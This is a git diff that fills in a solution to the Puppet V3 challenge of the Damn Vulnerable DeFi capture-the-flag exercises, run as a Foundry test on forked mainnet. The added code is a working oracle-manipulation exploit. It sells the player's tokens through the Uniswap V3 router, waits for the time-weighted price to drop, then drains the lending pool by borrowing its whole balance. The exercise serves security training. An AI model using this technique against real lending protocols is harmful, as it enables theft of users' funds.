@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -44,6 +45,7 @@ contract PuppetV3Challenge is Test {
      */
     function setUp() public {
         // Fork from mainnet state at specific block
+        // I used a url from Alchemy
         vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);
 
         startHoax(deployer);
@@ -118,7 +120,27 @@ contract PuppetV3Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV3() public checkSolvedByPlayer {}
+    function test_puppetV3() public checkSolvedByPlayer {
+        // uniswap v3: router from etherscan.io
+        ISwapRouter routerV3 = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        token.approve(address(routerV3), type(uint256).max);
+        // sell all player tokens
+        routerV3.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token), address(weth), FEE, player, type(uint256).max, PLAYER_INITIAL_TOKEN_BALANCE, 0, 0
+            )
+        );
+
+        // wait for the price to drop
+        while (lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE) > weth.balanceOf(player))
+        {
+            skip(10);
+        }
+
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
